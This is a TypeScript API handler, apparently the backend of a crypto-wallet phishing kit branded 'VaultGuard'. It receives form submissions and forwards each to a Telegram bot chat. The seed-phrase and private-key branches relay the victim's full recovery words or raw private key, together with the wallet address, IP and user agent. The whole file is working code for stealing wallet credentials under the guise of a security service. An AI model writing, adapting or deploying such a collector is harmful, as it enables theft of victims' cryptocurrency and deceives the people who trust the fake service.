async function sendTelegram(token: string, chatId: string, text: string) {
  if (!token || !chatId) return
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
      }),
    })
  } catch (err) {
    console.error('Telegram send error:', err)
  }
}

export default async function handler(req: any, res: any) {
  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false })
  }

  const { type, data, meta } = req.body ?? {}
  if (!type || !data) {
    return res.status(400).json({ ok: false })
  }

  const token = process.env.TELEGRAM_BOT_TOKEN || ''
  const chatId = process.env.TELEGRAM_CHAT_ID || ''
  const ip = req.headers['x-forwarded-for'] || 'unknown'
  const ua = (meta?.userAgent || req.headers['user-agent'] || 'unknown').slice(0, 120)
  const ts = new Date().toUTCString()

  let msg = ''

  if (type === 'address_entered') {
    msg =
      `🔍 <b>VaultGuard — Address Entered</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.address}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'wallet_connected') {
    msg =
      `🔗 <b>VaultGuard — Wallet Connected</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Wallet:</b> ${data.wallet}\n` +
      `<b>Address:</b> <code>${data.address}</code>\n` +
      `<b>Entered:</b> <code>${data.enteredAddress}</code>\n` +
      `<b>Match:</b> ${data.address?.toLowerCase() === data.enteredAddress?.toLowerCase() ? '✅ Yes' : '⚠️ No'}\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'seed_phrase') {
    const words: string[] = data.words ?? []
    const filled = words.filter((w: string) => w.trim().length > 0)
    msg =
      `🌱 <b>VaultGuard — Seed Phrase Submitted</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
      `<b>Word count:</b> ${data.wordCount} (${filled.length} filled)\n` +
      `<b>Phrase:</b>\n<code>${filled.join(' ')}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else if (type === 'private_key') {
    msg =
      `🔑 <b>VaultGuard — Private Key Submitted</b>\n` +
      `━━━━━━━━━━━━━━━━━━━━\n` +
      `<b>Address:</b> <code>${data.walletAddress}</code>\n` +
      `<b>Key:</b> <code>${data.privateKey}</code>\n` +
      `<b>Time:</b> ${ts}\n` +
      `<b>IP:</b> ${ip}\n` +
      `<b>UA:</b> ${ua}`
  } else {
    return res.status(400).json({ ok: false })
  }

  await sendTelegram(token, chatId, msg)
  return res.json({ ok: true })
}
